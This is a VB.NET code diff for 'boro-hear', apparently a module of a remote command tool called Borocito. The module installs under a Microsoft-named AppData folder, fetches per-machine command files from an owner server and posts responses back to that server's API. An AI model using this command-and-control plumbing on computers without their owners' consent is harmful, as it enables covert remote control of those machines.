@@ -43,6 +43,9 @@ Module GlobalUses
     Public parameters As String
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
     Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
+    Public compileVersion As String = My.Application.Info.Version.ToString &
+        " (" & Application.ProductVersion & ") " &
+        "[14/04/2023 20:56]" 'Indicacion exacta de la ultima compilacion
 
     Public HttpOwnerServer As String
     Public UID As String
@@ -76,7 +79,7 @@ Module StartUp
         Try
             AddToLog("LoadRegedit@Memory", "Loading data...", False)
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
-            HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
+            HttpOwnerServer = regKey.GetValue("OwnerServer")
             UID = regKey.GetValue("UID")
             RegisterInstance()
         Catch ex As Exception
@@ -126,10 +129,7 @@ Module ResponseAdministrator
             End Try
             Threading.Thread.Sleep(5000) '5 sec para evitar solapados
             If sendStatus Then
-                AddToLog("SendToServer@server_CONNECT", "Processing: " & message, False)
-                'Create CMD file on server
-                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
-                request.Method = "POST"
+                AddToLog("Network", "Processing: " & message, False)
                 'Obtener comando actual (evita interferir)
                 Dim remoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                 Dim localCommandFile As String = DIRHome & "\actualCommand.str"
@@ -139,29 +139,49 @@ Module ResponseAdministrator
                 My.Computer.Network.DownloadFile(remoteCommandFile, localCommandFile)
                 Dim lineas = IO.File.ReadAllLines(localCommandFile)
                 'Prepara el mensaje
-                Dim postData As String = "ident=" & UID & "&text=" & "#boro-hear response (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
+                'Header format
+                '   #|cli_nickname|UID|response_date
+                Dim postData As String = "#|BORO-HEAR|" & UID & "|" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") &
                     vbCrLf & "Command1>" & lineas(1).Split(">"c)(1).Trim() &
                     vbCrLf & "Command2>" & lineas(2).Split(">"c)(1).Trim() &
                     vbCrLf & "Command3>" & lineas(3).Split(">"c)(1).Trim() &
                     vbCrLf & "[Response]" &
-                    vbCrLf & "(BORO-HEAR) " & message
-                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-                request.ContentType = "application/x-www-form-urlencoded"
-                request.ContentLength = byteArray.Length
-                Dim dataStream As Stream = request.GetRequestStream()
-                dataStream.Write(byteArray, 0, byteArray.Length)
-                dataStream.Close()
-                Dim response As WebResponse = request.GetResponse()
-                AddToLog("SendToServer@server_CONNECT", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
-                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
-                'End If
-                response.Close()
+                    vbCrLf & message
+                SendAPIRequest(postData)
             Else
-                AddToLog("SendToServer@server_CONNECT", "boro-hear paused. Can't process: " & message, False)
+                AddToLog("SendToServer@ResponseAdministrator", "boro-hear paused. Can't process: " & message, False)
             End If
         Catch ex As Exception
-            AddToLog("SendToServer@server_CONNECT", "Error: " & ex.Message, True)
+            AddToLog("SendToServer@ResponseAdministrator", "Error: " & ex.Message, True)
         End Try
     End Sub
+
+    Function SendAPIRequest(ByVal content As String) As Boolean
+        Try
+            'AddToLog("Network", "Sending API Request...", False)
+
+            Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
+            content = content.Replace("&", "{ampersand}")
+            content = content.Replace("?", "{questionmark}")
+            Dim postData As String = "content=" & content
+            request.ContentType = "application/x-www-form-urlencoded"
+            request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
+            request.Method = "POST"
+            request.Headers("Ident") = UID
+            request.Headers("Clase") = "COMMAND"
+
+            Dim dataStream As New StreamWriter(request.GetRequestStream())
+            dataStream.Write(postData)
+            dataStream.Close()
+            Dim response As WebResponse = request.GetResponse()
+            AddToLog("Network", "Response: " & CType(response, HttpWebResponse).StatusCode & " " & CType(response, HttpWebResponse).StatusDescription, False)
+            response.Close()
+
+            Return True
+        Catch ex As Exception
+            AddToLog("SendAPIRequest@ResponseAdministrator", "Error: " & ex.Message, True)
+            Return False
+        End Try
+    End Function
 End Module
 'Si ya hay un mensaje BORO-HEAR en el fichero de comando, entonces deberia escribirse en la siguiente linea.
